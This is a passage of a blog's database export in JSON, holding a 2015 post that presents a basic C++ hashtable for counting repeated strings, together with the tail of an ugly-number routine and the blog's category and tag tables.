b<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a<span class=\"comment\">;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">int</span> nthUglyNumber(<span class=\"built_in\">int</span> n) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> l2[<span class=\"number\">10000</span>], l3[<span class=\"number\">10000</span>],l5[<span class=\"number\">10000</span>]<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> c2 = <span class=\"number\">1</span>,c3 = <span class=\"number\">1</span>,c5 = <span class=\"number\">1</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> h2 = <span class=\"number\">0</span>,h3 = <span class=\"number\">0</span>,h5 = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> <span class=\"built_in\">now</span> = <span class=\"number\">1</span><span class=\"comment\">;</span></span><br><span class=\"line\">    l2[<span class=\"number\">0</span>] = l3[<span class=\"number\">0</span>] = l5[<span class=\"number\">0</span>] = <span class=\"number\">1</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"built_in\">int</span> i = <span class=\"number\">0</span><span class=\"comment\">;i &lt; n;++ i)&#123;</span></span><br><span class=\"line\">        <span class=\"built_in\">now</span> = <span class=\"built_in\">min</span>(l2[h2],<span class=\"built_in\">min</span>(l3[h3],l5[h5]))<span class=\"comment\">;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">now</span> == l2[h2]) h2 ++<span class=\"comment\">;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">now</span> == l3[h3]) h3 ++<span class=\"comment\">;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">now</span> == l5[h5]) h5 ++<span class=\"comment\">;</span></span><br><span class=\"line\">        l2[c2 ++] = <span class=\"built_in\">now</span> * <span class=\"number\">2</span><span class=\"comment\">;</span></span><br><span class=\"line\">        l3[c3 ++] = <span class=\"built_in\">now</span> * <span class=\"number\">3</span><span class=\"comment\">;</span></span><br><span class=\"line\">        l5[c5 ++] = <span class=\"built_in\">now</span> * <span class=\"number\">5</span><span class=\"comment\">;</span></span><br><span class=\"line\">        cout &lt;&lt; <span class=\"built_in\">now</span> &lt;&lt; endl<span class=\"comment\">;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">now</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Very basic hashtable","date":"2015-10-20T19:59:30.000Z","_content":"This is only a very basic hashtable\nI use half an hour to write it(such a easy program takes me so long)\nThe hash function of string is simply sum all of the charactors up and times a prime number\nThis program is used to calculate how many times of every input string appears\nThe structure of this hashtable is like this:\n<!--more-->\n![hashtable](/image/20151020195930.jpg)\nJust a simple implement without any optimize\nThe input is \nn//The number of strings\nstring a\n...\nstring n\nThe output is the hashtable\n```\n#include <stdio.h>\n#include <iostream>\n#include <string>\nusing namespace std;\n#define HASH 7\nstruct Node{\n    string val;\n    int num;\n    Node * next;\n};\n\nNode * hashTable[HASH];\n\nint hash(string s){// stupid way to hash a string\n    int res = 0;\n    for(int i = 0;i < s.length();++ i) res += s[i];\n    res = res * 97 * 31 / 37;\n    return res;\n}\n\n\nbool insert(string s){\n    int h = hash(s) % HASH;\n    Node * node = hashTable[h];\n    if(!node) {\n        node = new Node;\n        node -> val = s;\n        node -> num = 1;\n        node -> next = NULL;\n        hashTable[h] = node;\n    }else{\n        while(node){\n            if(node -> val == s){\n                (node -> num) ++;\n                return true;\n            }\n            node = node -> next;\n        }\n        node = new Node;\n        node -> val = s;\n        node -> num = 1;\n        node -> next = hashTable[h];\n        hashTable[h] = node;\n    }\n    return false;\n}\nvoid output(){\n    Node * node;\n    for(int i = 0;i < HASH;++ i){\n        if(hashTable[i]){\n            node = hashTable[i];\n            while(node){\n                cout << node -> val << ' ' << node -> num << ' ';\n                node =  node -> next;\n            }\n            cout << endl;\n        }\n    }\n    return ;\n}\n\nint main(){\n    int n;\n    string s;\n    cin >> n;\n    for(int i = 0;i < n;++ i){\n        cin >> s;\n        insert(s);\n    }\n    output();\n    return 0;\n}\n\n\n```\n","source":"_posts/verybasichashtable.md","raw":"title: \"Very basic hashtable\"\ndate: 2015-10-20 19:59:30\ntags: Algorithm\n---\nThis is only a very basic hashtable\nI use half an hour to write it(such a easy program takes me so long)\nThe hash function of string is simply sum all of the charactors up and times a prime number\nThis program is used to calculate how many times of every input string appears\nThe structure of this hashtable is like this:\n<!--more-->\n![hashtable](/image/20151020195930.jpg)\nJust a simple implement without any optimize\nThe input is \nn//The number of strings\nstring a\n...\nstring n\nThe output is the hashtable\n```\n#include <stdio.h>\n#include <iostream>\n#include <string>\nusing namespace std;\n#define HASH 7\nstruct Node{\n    string val;\n    int num;\n    Node * next;\n};\n\nNode * hashTable[HASH];\n\nint hash(string s){// stupid way to hash a string\n    int res = 0;\n    for(int i = 0;i < s.length();++ i) res += s[i];\n    res = res * 97 * 31 / 37;\n    return res;\n}\n\n\nbool insert(string s){\n    int h = hash(s) % HASH;\n    Node * node = hashTable[h];\n    if(!node) {\n        node = new Node;\n        node -> val = s;\n        node -> num = 1;\n        node -> next = NULL;\n        hashTable[h] = node;\n    }else{\n        while(node){\n            if(node -> val == s){\n                (node -> num) ++;\n                return true;\n            }\n            node = node -> next;\n        }\n        node = new Node;\n        node -> val = s;\n        node -> num = 1;\n        node -> next = hashTable[h];\n        hashTable[h] = node;\n    }\n    return false;\n}\nvoid output(){\n    Node * node;\n    for(int i = 0;i < HASH;++ i){\n        if(hashTable[i]){\n            node = hashTable[i];\n            while(node){\n                cout << node -> val << ' ' << node -> num << ' ';\n                node =  node -> next;\n            }\n            cout << endl;\n        }\n    }\n    return ;\n}\n\nint main(){\n    int n;\n    string s;\n    cin >> n;\n    for(int i = 0;i < n;++ i){\n        cin >> s;\n        insert(s);\n    }\n    output();\n    return 0;\n}\n\n\n```\n","slug":"verybasichashtable","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vw002ywypdw8n1b4ck","content":"<p>This is only a very basic hashtable<br>I use half an hour to write it(such a easy program takes me so long)<br>The hash function of string is simply sum all of the charactors up and times a prime number<br>This program is used to calculate how many times of every input string appears<br>The structure of this hashtable is like this:<br><a id=\"more\"></a><br><img src=\"/image/20151020195930.jpg\" alt=\"hashtable\"><br>Just a simple implement without any optimize<br>The input is<br>n//The number of strings<br>string a<br>…<br>string n<br>The output is the hashtable<br><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;iostream&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;string&gt;</span></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"><span class=\"comment\">#define HASH 7</span></span><br><span class=\"line\">struct <span class=\"keyword\">Node</span><span class=\"title\">&#123;</span><br><span class=\"line\">    string</span> val;</span><br><span class=\"line\">    int num;</span><br><span class=\"line\">    <span class=\"keyword\">Node</span> <span class=\"title\">* next</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">Node</span> <span class=\"title\">* hashTable</span>[HASH];</span><br><span class=\"line\"></span><br><span class=\"line\">int hash(<span class=\"keyword\">string</span> s)&#123;// stupid way to hash a <span class=\"keyword\">string</span></span><br><span class=\"line\">    int res = <span class=\"number\">0</span>;</span><br><span class=\"line\">    for(int i = <span class=\"number\">0</span>;i <span class=\"tag\">&lt; s.length();++ i) res += s[i];</span><br><span class=\"line\">    res = res * 97 * 31 / 37;</span><br><span class=\"line\">    return res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bool insert(string s)&#123;</span><br><span class=\"line\">    int h = hash(s) % HASH;</span><br><span class=\"line\">    Node * node = hashTable[h];</span><br><span class=\"line\">    if(!node) &#123;</span><br><span class=\"line\">        node = new Node;</span><br><span class=\"line\">        node -&gt;</span> val = s;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; num</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; next</span> = NULL;</span><br><span class=\"line\">        hashTable[h] = <span class=\"keyword\">node</span><span class=\"title\">;</span><br><span class=\"line\">    &#125;else</span>&#123;</span><br><span class=\"line\">        while(<span class=\"keyword\">node</span><span class=\"title\">)&#123;</span><br><span class=\"line\">            if</span>(<span class=\"keyword\">node</span> <span class=\"title\">-&gt; val</span> == s)&#123;</span><br><span class=\"line\">                (<span class=\"keyword\">node</span> <span class=\"title\">-&gt; num</span>) ++;</span><br><span class=\"line\">                return <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">node</span> <span class=\"title\">= node</span> -&gt; next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">= new</span> <span class=\"keyword\">Node</span><span class=\"title\">;</span><br><span class=\"line\">        node</span> -&gt; val = s;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; num</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; next</span> = hashTable[h];</span><br><span class=\"line\">        hashTable[h] = <span class=\"keyword\">node</span><span class=\"title\">;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void output()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">Node</span> <span class=\"title\">* node</span>;</span><br><span class=\"line\">    for(int i = <span class=\"number\">0</span>;i <span class=\"tag\">&lt; HASH;++ i)&#123;</span><br><span class=\"line\">        if(hashTable[i])&#123;</span><br><span class=\"line\">            node = hashTable[i];</span><br><span class=\"line\">            while(node)&#123;</span><br><span class=\"line\">                cout &lt;&lt; node -&gt;</span> val <span class=\"tag\">&lt;&lt; ' ' &lt;&lt; node -&gt;</span> num <span class=\"tag\">&lt;&lt; ' ';</span><br><span class=\"line\">                node =  node -&gt;</span> next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            cout <span class=\"tag\">&lt;&lt; endl;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\">    int n;</span><br><span class=\"line\">    string s;</span><br><span class=\"line\">    cin &gt;</span>&gt; n;</span><br><span class=\"line\">    for(int i = <span class=\"number\">0</span>;i <span class=\"tag\">&lt; n;++ i)&#123;</span><br><span class=\"line\">        cin &gt;</span>&gt; s;</span><br><span class=\"line\">        insert(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    output();</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>This is only a very basic hashtable<br>I use half an hour to write it(such a easy program takes me so long)<br>The hash function of string is simply sum all of the charactors up and times a prime number<br>This program is used to calculate how many times of every input string appears<br>The structure of this hashtable is like this:<br>","more":"<br><img src=\"/image/20151020195930.jpg\" alt=\"hashtable\"><br>Just a simple implement without any optimize<br>The input is<br>n//The number of strings<br>string a<br>…<br>string n<br>The output is the hashtable<br><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;iostream&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;string&gt;</span></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"><span class=\"comment\">#define HASH 7</span></span><br><span class=\"line\">struct <span class=\"keyword\">Node</span><span class=\"title\">&#123;</span><br><span class=\"line\">    string</span> val;</span><br><span class=\"line\">    int num;</span><br><span class=\"line\">    <span class=\"keyword\">Node</span> <span class=\"title\">* next</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">Node</span> <span class=\"title\">* hashTable</span>[HASH];</span><br><span class=\"line\"></span><br><span class=\"line\">int hash(<span class=\"keyword\">string</span> s)&#123;// stupid way to hash a <span class=\"keyword\">string</span></span><br><span class=\"line\">    int res = <span class=\"number\">0</span>;</span><br><span class=\"line\">    for(int i = <span class=\"number\">0</span>;i <span class=\"tag\">&lt; s.length();++ i) res += s[i];</span><br><span class=\"line\">    res = res * 97 * 31 / 37;</span><br><span class=\"line\">    return res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bool insert(string s)&#123;</span><br><span class=\"line\">    int h = hash(s) % HASH;</span><br><span class=\"line\">    Node * node = hashTable[h];</span><br><span class=\"line\">    if(!node) &#123;</span><br><span class=\"line\">        node = new Node;</span><br><span class=\"line\">        node -&gt;</span> val = s;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; num</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; next</span> = NULL;</span><br><span class=\"line\">        hashTable[h] = <span class=\"keyword\">node</span><span class=\"title\">;</span><br><span class=\"line\">    &#125;else</span>&#123;</span><br><span class=\"line\">        while(<span class=\"keyword\">node</span><span class=\"title\">)&#123;</span><br><span class=\"line\">            if</span>(<span class=\"keyword\">node</span> <span class=\"title\">-&gt; val</span> == s)&#123;</span><br><span class=\"line\">                (<span class=\"keyword\">node</span> <span class=\"title\">-&gt; num</span>) ++;</span><br><span class=\"line\">                return <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">node</span> <span class=\"title\">= node</span> -&gt; next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">= new</span> <span class=\"keyword\">Node</span><span class=\"title\">;</span><br><span class=\"line\">        node</span> -&gt; val = s;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; num</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">node</span> <span class=\"title\">-&gt; next</span> = hashTable[h];</span><br><span class=\"line\">        hashTable[h] = <span class=\"keyword\">node</span><span class=\"title\">;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void output()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">Node</span> <span class=\"title\">* node</span>;</span><br><span class=\"line\">    for(int i = <span class=\"number\">0</span>;i <span class=\"tag\">&lt; HASH;++ i)&#123;</span><br><span class=\"line\">        if(hashTable[i])&#123;</span><br><span class=\"line\">            node = hashTable[i];</span><br><span class=\"line\">            while(node)&#123;</span><br><span class=\"line\">                cout &lt;&lt; node -&gt;</span> val <span class=\"tag\">&lt;&lt; ' ' &lt;&lt; node -&gt;</span> num <span class=\"tag\">&lt;&lt; ' ';</span><br><span class=\"line\">                node =  node -&gt;</span> next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            cout <span class=\"tag\">&lt;&lt; endl;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\">    int n;</span><br><span class=\"line\">    string s;</span><br><span class=\"line\">    cin &gt;</span>&gt; n;</span><br><span class=\"line\">    for(int i = <span class=\"number\">0</span>;i <span class=\"tag\">&lt; n;++ i)&#123;</span><br><span class=\"line\">        cin &gt;</span>&gt; s;</span><br><span class=\"line\">        insert(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    output();</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"}],"PostAsset":[],"PostCategory":[{"post_id":"ciph681u60003wypdz4a6ghpt","category_id":"ciph681u80005wypdjd9jk33x","_id":"ciph681u90007wypdhkp902ar"},{"post_id":"ciph681ue000ewypd8ofwjhf2","category_id":"ciph681ue000fwypd3ml0libx","_id":"ciph681uf000gwypdo0dv0f26"},{"post_id":"ciph681un000qwypdb3ad7m29","category_id":"ciph681uo000swypd0o99szd4","_id":"ciph681uo000twypddh5iqdm9"},{"post_id":"ciph681ur000zwypd2dawftb4","category_id":"ciph681uo000swypd0o99szd4","_id":"ciph681us0011wypd204kzk1u"},{"post_id":"ciph681v0001dwypdt6cvr189","category_id":"ciph681v2001fwypduxgn27t8","_id":"ciph681v3001hwypdn3d51n13"},{"post_id":"ciph681v5001mwypd647vz2t5","category_id":"ciph681uo000swypd0o99szd4","_id":"ciph681v7001owypd7okjywik"},{"post_id":"ciph681v7001pwypdit02vx51","category_id":"ciph681v8001rwypda80cgxce","_id":"ciph681v9001twypdxpjmnpzn"},{"post_id":"ciph681v9001uwypd53s6viqt","category_id":"ciph681uo000swypd0o99szd4","_id":"ciph681vb001wwypdstolj3ul"},{"post_id":"ciph681vb001xwypdkcs8cmcf","category_id":"ciph681v8001rwypda80cgxce","_id":"ciph681vc001zwypdi3reyc3b"},{"post_id":"ciph681vd0020wypdsc6d4ri4","category_id":"ciph681u80005wypdjd9jk33x","_id":"ciph681ve0022wypd592wxb2x"},{"post_id":"ciph681ve0023wypdsrnytdn2","category_id":"ciph681v8001rwypda80cgxce","_id":"ciph681vg0025wypdwh833l85"},{"post_id":"ciph681vg0026wypd0lwajo6g","category_id":"ciph681v8001rwypda80cgxce","_id":"ciph681vh0028wypdy7uuyssk"},{"post_id":"ciph681vh0029wypdg57pqvcv","category_id":"ciph681vi002awypdvipj0stg","_id":"ciph681vi002bwypda4ppzm1o"},{"post_id":"ciph681vj002cwypd777nbygw","category_id":"ciph681uo000swypd0o99szd4","_id":"ciph681vj002ewypd0muuyvau"},{"post_id":"ciph681vl002hwypdedb9h64b","category_id":"ciph681vm002jwypdd6wkrvij","_id":"ciph681vm002kwypd4nedtyvo"},{"post_id":"ciph681vt002pwypd48fv1qoh","category_id":"ciph681vt002rwypdhp80iyyc","_id":"ciph681vu002twypdeeqtodv9"}],"PostTag":[{"post_id":"ciph681ty0000wypdht5h5yri","tag_id":"ciph681u40001wypdjcsbchrx","_id":"ciph681u50002wypdcr7tzwfb"},{"post_id":"ciph681u60003wypdz4a6ghpt","tag_id":"ciph681u80004wypdsvdbxvto","_id":"ciph681u80006wypdmv19odcd"},{"post_id":"ciph681u90008wypdpnygkhli","tag_id":"ciph681ua0009wypduoz4ow4s","_id":"ciph681ua000awypd8099a7pa"},{"post_id":"ciph681uc000bwypdcu3cr9r6","tag_id":"ciph681ud000cwypdk57sj3gt","_id":"ciph681ud000dwypduo7g3xwq"},{"post_id":"ciph681uf000hwypdqrovdp4f","tag_id":"ciph681u40001wypdjcsbchrx","_id":"ciph681ui000iwypdnvpnadd3"},{"post_id":"ciph681ui000jwypdkkwt0oig","tag_id":"ciph681u40001wypdjcsbchrx","_id":"ciph681uj000kwypd9umaeyhp"},{"post_id":"ciph681uk000lwypdpmmq6085","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681ul000nwypdtqn7ffag"},{"post_id":"ciph681um000owypdg4jovsi3","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681um000pwypdedcs10ju"},{"post_id":"ciph681un000qwypdb3ad7m29","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681uo000rwypdqxg04qj5"},{"post_id":"ciph681up000uwypdqzw45jle","tag_id":"ciph681up000vwypdw1tjh9rf","_id":"ciph681up000wwypdvdnmhz3l"},{"post_id":"ciph681uq000xwypd1fktw648","tag_id":"ciph681ua0009wypduoz4ow4s","_id":"ciph681ur000ywypdo9d4jgwx"},{"post_id":"ciph681ur000zwypd2dawftb4","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681us0010wypduonwc08f"},{"post_id":"ciph681us0012wypd6norjttt","tag_id":"ciph681up000vwypdw1tjh9rf","_id":"ciph681ut0013wypdu5z8vjcn"},{"post_id":"ciph681uu0014wypdre9o7fqq","tag_id":"ciph681uv0015wypd8daug8l7","_id":"ciph681uv0016wypdmzx6ti8b"},{"post_id":"ciph681uv0017wypdh48iumuv","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681uw0018wypdhdkf6oor"},{"post_id":"ciph681uw0019wypdmogs2n43","tag_id":"ciph681up000vwypdw1tjh9rf","_id":"ciph681ux001awypdhck2q3bi"},{"post_id":"ciph681uy001bwypdckihdeao","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681uz001cwypdleaqxk87"},{"post_id":"ciph681v0001dwypdt6cvr189","tag_id":"ciph681v2001ewypdocvqote0","_id":"ciph681v2001gwypdvism8zer"},{"post_id":"ciph681v3001iwypdmqkhg7ho","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681v4001jwypdxd5kuvbh"},{"post_id":"ciph681v4001kwypdd2x72as7","tag_id":"ciph681u40001wypdjcsbchrx","_id":"ciph681v4001lwypdmpbvgyn8"},{"post_id":"ciph681v5001mwypd647vz2t5","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681v7001nwypd2yvv4o0p"},{"post_id":"ciph681v7001pwypdit02vx51","tag_id":"ciph681v8001qwypdd0xok8ow","_id":"ciph681v8001swypdgmihsd5f"},{"post_id":"ciph681v9001uwypd53s6viqt","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681vb001vwypd7a2gnrmz"},{"post_id":"ciph681vb001xwypdkcs8cmcf","tag_id":"ciph681v8001qwypdd0xok8ow","_id":"ciph681vc001ywypd6sg92xys"},{"post_id":"ciph681vd0020wypdsc6d4ri4","tag_id":"ciph681u80004wypdsvdbxvto","_id":"ciph681ve0021wypdhdvb8joc"},{"post_id":"ciph681ve0023wypdsrnytdn2","tag_id":"ciph681v8001qwypdd0xok8ow","_id":"ciph681vf0024wypd1ime262q"},{"post_id":"ciph681vg0026wypd0lwajo6g","tag_id":"ciph681v8001qwypdd0xok8ow","_id":"ciph681vh0027wypdro5egg43"},{"post_id":"ciph681vj002cwypd777nbygw","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681vj002dwypdenf68kuz"},{"post_id":"ciph681vk002fwypd0mao33x7","tag_id":"ciph681u40001wypdjcsbchrx","_id":"ciph681vk002gwypd3ohknm5i"},{"post_id":"ciph681vl002hwypdedb9h64b","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681vm002iwypdpk29wuwd"},{"post_id":"ciph681vn002lwypdnsbndx6b","tag_id":"ciph681u40001wypdjcsbchrx","_id":"ciph681vp002mwypdog82zk89"},{"post_id":"ciph681vs002nwypd3nk81agy","tag_id":"ciph681ua0009wypduoz4ow4s","_id":"ciph681vs002owypd7vkraqsh"},{"post_id":"ciph681vt002pwypd48fv1qoh","tag_id":"ciph681vt002qwypdhi3uicks","_id":"ciph681vu002swypd1vjncrhz"},{"post_id":"ciph681vu002uwypd44d5sank","tag_id":"ciph681ua0009wypduoz4ow4s","_id":"ciph681vv002vwypdhy4xzb8p"},{"post_id":"ciph681vv002wwypdyb50quuv","tag_id":"ciph681ua0009wypduoz4ow4s","_id":"ciph681vw002xwypdo88w3ens"},{"post_id":"ciph681vw002ywypdw8n1b4ck","tag_id":"ciph681ul000mwypdya8trgp3","_id":"ciph681vx002zwypdt99yucni"}],"Tag":[{"name":"Machine Fingerprinting","_id":"ciph681u40001wypdjcsbchrx"},{"name":"Play","_id":"ciph681u80004wypdsvdbxvto"},{"name":"leetcode","_id":"ciph681ua0009wypduoz4ow4s"},{"name":"Python","_id":"ciph681ud000cwypdk57sj3gt"},{"name":"Algorithm","_id":"ciph681ul000mwypdya8trgp3"},{"name":"ADV Programming","_id":"ciph681up000vwypdw1tjh9rf"},{"name":"Piano sheet","_id":"ciph681uv0015wypd8daug8l7"},{"name":"IS","_id":"ciph681v2001ewypdocvqote0"},{"name":"Notes","_id":"ciph681v8001qwypdd0xok8ow"},{"name":"IT","_id":"ciph681vt002qwypdhi3uicks"}]}}